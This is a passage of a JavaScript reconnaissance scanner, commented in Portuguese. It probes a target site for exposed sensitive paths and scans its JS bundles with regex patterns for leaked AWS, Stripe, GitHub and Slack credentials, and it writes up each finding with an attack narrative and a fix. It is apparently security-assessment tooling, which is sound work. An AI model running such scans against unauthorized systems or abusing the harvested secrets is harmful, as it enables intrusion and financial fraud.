          phase: 'paths', severity: sev, cvss: sev === 'ALTO' ? 7.5 : 5.3,
          title: 'Path sensível público: ' + p,
          description: 'HTTP 200 · ' + parsed.size + ' bytes · ' + parsed.ct,
          command: cmd, url: urlOf(url) + p, response: outputOf(r),
          attackNarrative: /\.env/.test(p) ? '.env vaza credenciais de DB, API keys, secret tokens. Atacante entra no DB direto.' :
                           /\.git/.test(p) ? '.git exposto permite `git-dumper` clonar todo o histórico → código-fonte + credenciais em commits antigos.' :
                           /swagger|openapi/.test(p) ? 'Swagger público entrega o "manual" da API — todos os endpoints, schemas, exemplos de request. Reduz reconnaissance de horas para segundos.' :
                           /actuator/.test(p) ? 'Spring Actuator expõe env vars, heap dumps, threads. /actuator/env vaza database URL + password.' :
                           'Path administrativo/config exposto sem auth.',
          businessImpact: 'Depende do path — pode ser exposição total (credenciais DB) ou parcial (schemas API).',
          fix: /\.env|\.git|backup|dump/.test(p) ? 'Nginx: `location ~ /\\.(env|git|bak|zip|sql) { deny all; return 404; }`' : 'Autenticação obrigatória. Se for endpoint interno, restringir por IP allowlist.',
          references: ['OWASP Testing Guide 4.0 § File Extension Handling'],
        }));
      }
    }
  }

  var SECRET_REGEX = [
    { name: 'AWS Access Key', re: /AKIA[0-9A-Z]{16}/g, sev: 'ALTO' },
    { name: 'Google API Key', re: /AIza[0-9A-Za-z_-]{35}/g, sev: 'ALTO' },
    { name: 'Stripe Live Key', re: /sk_live_[0-9a-zA-Z]{24,}/g, sev: 'ALTO' },
    { name: 'Stripe Test Key', re: /sk_test_[0-9a-zA-Z]{24,}/g, sev: 'MÉDIO' },
    { name: 'GitHub PAT', re: /ghp_[0-9a-zA-Z]{36}/g, sev: 'ALTO' },
    { name: 'GitHub App Token', re: /ghs_[0-9a-zA-Z]{36}/g, sev: 'ALTO' },
    { name: 'Slack Bot Token', re: /xoxb-[0-9a-zA-Z-]{20,}/g, sev: 'ALTO' },
    { name: 'JWT', re: /eyJ[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{15,}/g, sev: 'MÉDIO' },
    { name: 'Supabase URL', re: /https?:\/\/[a-z0-9]{20}\.supabase\.co/g, sev: 'MÉDIO' },
    { name: 'S3 Bucket', re: /[a-z0-9.-]+\.s3[.-][a-z0-9.-]*amazonaws\.com/g, sev: 'MÉDIO' },
    { name: 'Discord Webhook', re: /discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/g, sev: 'ALTO' },
    { name: 'Slack Webhook', re: /hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g, sev: 'ALTO' },
    { name: 'service_role', re: /service_role/g, sev: 'ALTO' },
  ];

  async function phaseJsSecrets(url, findings) {
    var host = hostOf(url);
    var htmlCmd = 'curl -s --max-time 12 ' + urlOf(url);
    var htmlR = await runTool(htmlCmd, host);
    var html = outputOf(htmlR);
    var bundles = [];
    var reScript = /<script[^>]+src\s*=\s*["']([^"']+\.js[^"']*)["']/gi;
    var m;
    while ((m = reScript.exec(html)) && bundles.length < 5) {
      var src = m[1];
      if (src.startsWith('//')) src = 'https:' + src;
      else if (src.startsWith('/')) src = urlOf(url).replace(/\/$/, '') + src;
      else if (!/^https?:/i.test(src)) src = urlOf(url).replace(/\/$/, '') + '/' + src;
      if (src.indexOf(host) !== -1) bundles.push(src);
    }
    for (var i = 0; i < bundles.length; i++) {
      var bundleCmd = 'curl -s --max-time 20 ' + bundles[i];
      var bR = await runTool(bundleCmd, host, 30000);
      var body = outputOf(bR);
      if (body.length < 100) continue;
      SECRET_REGEX.forEach(function (rx) {
        var matches = body.match(rx.re);
        if (matches) {
          var unique = Array.from(new Set(matches));
          unique.slice(0, 3).forEach(function (v) {
            // Contexto: 60 chars antes/depois
            var idx = body.indexOf(v);
            var ctx = body.slice(Math.max(0, idx - 60), idx + v.length + 60);
            findings.push(newFinding({
              phase: 'js-secrets', severity: rx.sev, cvss: rx.sev === 'ALTO' ? 7.5 : 5.3,
              title: rx.name + ' em bundle JS',
              description: v.slice(0, 60) + (v.length > 60 ? '…' : ''),
              command: bundleCmd, url: bundles[i], response: '…' + ctx + '…',
              evidence: [{ label: 'Contexto (60 chars antes/depois)', value: ctx }],
              attackNarrative: /AKIA/.test(rx.name) ? 'AWS key permite atacar S3/EC2/RDS. Se tiver IAM ampla = takeover da conta AWS.' :
                              /AIza/.test(rx.name) ? 'Google API key: se tiver Google Maps API sem restrição, atacante usa para gerar milhões de chamadas cobradas na conta da empresa (bill abuse). Verificar restrições!' :
                              /Stripe/.test(rx.name) ? 'Stripe live secret key = movimentar dinheiro da conta Stripe.' :
                              /GitHub/.test(rx.name) ? 'GitHub PAT permite push em repos privados. Backdoor no código.' :
                              /Slack|Discord webhook/.test(rx.name) ? 'Webhook permite envio de mensagens em canais internos → spear phishing.' :
                              /Supabase/.test(rx.name) ? 'Supabase URL exposta é OK SE Row Level Security (RLS) estiver ativa. Se não, qualquer um lê/escreve tabelas. Testar com anon key.' :
                              /JWT/.test(rx.name) ? 'JWT hardcoded expõe claims (role, tenant, exp). Se secret vazado junto, forjar tokens.' :
                              'Segredo exposto no client. Nunca deveria estar aqui.',
              businessImpact: 'Depende do tipo. AWS key = catastrófico. Stripe = fraude financeira. Slack/Discord webhook = phishing interno.',
              fix: 'REMOVER do bundle imediatamente. Rotacionar a chave (revogar antiga, gerar nova). Se for Google Maps API, adicionar HTTP referer restriction no console GCP. Migrar secrets para backend proxy — cliente chama backend, backend chama vendor com secret server-side.',
              references: ['CWE-798 · TruffleHog · gitleaks'],
            }));
          });
        }
      });
    }
  }

  // ═══════════════════════════════════════════════
  // Orquestrador V3
  // ═══════════════════════════════════════════════
  async function fullReconV3(rawTarget, step) {
    var host = hostOf(rawTarget);
    var url = urlOf(rawTarget);
    var findings = [];
    var startedAt = Date.now();

    step('🎯 **Recon V3 — Dossiê Profissional Replicável**');
    step('   Alvo: `' + host + '`');
    step('   Diferencial vs V2: cada achado carrega comando + URL + response + attack narrative + business impact + fix.');
    step('⏳ Executando 6 fases avançadas…');
    step('');

    step('### 📋 Fase 1/6 — HTTP + Security Headers');
    await phaseHeaders(url, findings);
    step('  → ' + findings.filter(function (f) { return f.phase === 'headers'; }).length + ' achado(s)');

    step('### 🌐 Fase 2/6 — DNS + DMARC/SPF + Vendors');
    await phaseDns(url, findings);
    step('  → ' + findings.filter(function (f) { return f.phase === 'dns'; }).length + ' achado(s)');

    step('### 🔐 Fase 3/6 — Auth ativo: schema/rate-limit/CORS reflection');
    try { await phaseAuthActive(url, findings); } catch (e) { step('  (skip: ' + e.message + ')'); }
    step('  → ' + findings.filter(function (f) { return f.phase === 'auth'; }).length + ' achado(s)');

    step('### 🔑 Fase 4/6 — Config endpoint discovery (frontend-config, etc)');
    await phaseConfigDiscovery(url, findings);
    step('  → ' + findings.filter(function (f) { return f.phase === 'config-discovery'; }).length + ' achado(s)');

    step('### 🏥 Fase 5/6 — /health e /status info disclosure');
    await phaseHealthEndpoints(url, findings);
    step('  → ' + findings.filter(function (f) { return f.phase === 'health-disclosure'; }).length + ' achado(s)');

    step('### 📂 Fase 6/6 — Common paths + JS bundle secrets');
    await phasePaths(url, findings);
    await phaseJsSecrets(url, findings);
    step('  → ' + findings.filter(function (f) { return f.phase === 'paths'; }).length + ' path(s), ' + findings.filter(function (f) { return f.phase === 'js-secrets'; }).length + ' secret(s)');

    step('');
    step('---');
    step('## 📊 Sumário — ' + findings.length + ' achados em ' + Math.round((Date.now() - startedAt) / 1000) + 's');
    var groups = { ALTO: [], 'MÉDIO': [], BAIXO: [], INFO: [] };
    findings.forEach(function (f) { if (groups[f.severity]) groups[f.severity].push(f); });
    ['ALTO', 'MÉDIO', 'BAIXO', 'INFO'].forEach(function (sev) {
      if (groups[sev].length) {
        step('### ' + { ALTO: '🔴', 'MÉDIO': '🟠', BAIXO: '🟡', INFO: '🟢' }[sev] + ' ' + sev + ' (' + groups[sev].length + ')');
        groups[sev].forEach(function (f) { step('  - **' + f.title + '** — ' + f.description.slice(0, 100)); });
      }
    });

    step('');
    step('✅ **Recon V3 TERMINADO** · Baixe o PDF profissional para ver cada achado com prova replicável (comando + URL + response + como atacante abusa + como corrigir).');

    window.__t3lastRecon = { host: host, findings: findings, at: new Date().toISOString(), engine: 'v3' };
    return { findings: findings, host: host };
  }

  // Expose
  window.__t3reconV3 = {
    fullReconV3: fullReconV3,
    newFinding: newFinding,
    VERSION: '3.0.0',
  };
  console.log('[Recon V3] instalado · use window.__t3reconV3.fullReconV3(target, stepFn)');
})();
